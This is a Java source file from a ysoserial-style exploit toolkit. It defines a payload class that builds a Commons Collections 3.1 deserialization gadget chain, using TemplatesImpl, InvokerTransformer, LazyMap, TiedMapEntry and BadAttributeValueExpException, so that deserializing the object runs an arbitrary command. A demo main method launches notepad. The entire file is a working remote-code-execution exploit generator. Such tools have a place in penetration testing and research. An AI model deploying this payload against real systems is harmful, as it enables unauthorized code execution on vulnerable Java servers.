package ysoserial.payloads;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.IDIOT9})
public class CommonsCollections5WithTempl implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorate = LazyMap.decorate(hashMap, newTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, templatesImpl);
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(bad, "val", tiedMapEntry);
        return bad;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections5WithTempl.class, new String[]{"notepad"});
    }
}
